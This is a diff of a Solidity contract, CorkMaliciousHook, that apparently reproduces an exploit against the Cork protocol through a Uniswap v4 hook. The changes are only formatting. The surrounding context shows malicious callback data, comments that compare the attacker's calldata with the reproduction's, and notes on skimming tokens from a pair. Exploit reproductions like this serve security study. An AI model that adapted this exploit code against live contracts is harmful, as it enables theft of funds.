@@ -177,19 +177,16 @@ contract CorkMaliciousHook {
         0000000000000000000000001d2724ca345e1889cecddefa5f8f83666a442c86
         */
         MaliciousCallbackData memory maliciousCallbackData = MaliciousCallbackData({
-            weETH8DS: _weETH8DS,
-            wstETH5CT: cts_3[0],
-            pairId: NEW_PAIR_ID_FOR_RATE,
-            wstETH5DS: ds_3[0]
+            weETH8DS: _weETH8DS, wstETH5CT: cts_3[0], pairId: NEW_PAIR_ID_FOR_RATE, wstETH5DS: ds_3[0]
         });
 
-        /* 
+        /*
         Our calldata only differs  in the NEW_PAIR_ID since the MaliciousCorkHook's address is not the same
         0000000000000000000000007ea0614072e2107c834365bea14f9b6386fb84a5
         00000000000000000000000051f70fe94e7ccd9f2efe45a4f2ea3a7ae0c62f8c
         5291badb2bc3a5fd46b91571f3858f63301883f319ae9deb908b0e4f350e6fa8
         0000000000000000000000001d2724ca345e1889cecddefa5f8f83666a442c86
-        
+
         However, this is pretty weird as all those addreses could be stored and retrieved directly from the
         attacker's hook context (this contract)
 
@@ -248,7 +245,7 @@ contract CorkMaliciousHook {
             sqrtPriceLimitX96: 79_228_162_514_264_337_593_543_950_336 // UniV4 SQRT_PRICE_1_1
         });
 
-        /* 
+        /*
             Attacker's calldata:
         0000000000000000000000000000000000000000000000000000000000000001
         0000000000000000000000009af3dce0813fd7428c47f57a39da2f6dd7c9bb09
@@ -268,7 +265,7 @@ contract CorkMaliciousHook {
         bytes memory hookData = abi.encode(flashSwapCallbackData);
 
         /*
-            Our Calldata 
+            Our Calldata
         0000000000000000000000000000000000000000000000000000000000000001
         000000000000000000000000f62849f9a0b5bf2913b396098f7c7019b51a820a
         0000000000000000000000000000000000000000000000000000000000000000
@@ -280,8 +277,8 @@ contract CorkMaliciousHook {
 
         // 4.13 Settle tokens
         /*
-         We use the oneMinusT from the marketSnapshot to calculate the amountIn used on the 
-         uniV4.take() call inside the beforeSwap() path. This amount is what the attacker then 
+         We use the oneMinusT from the marketSnapshot to calculate the amountIn used on the
+         uniV4.take() call inside the beforeSwap() path. This amount is what the attacker then
          skimmed again from the pair.
 
 
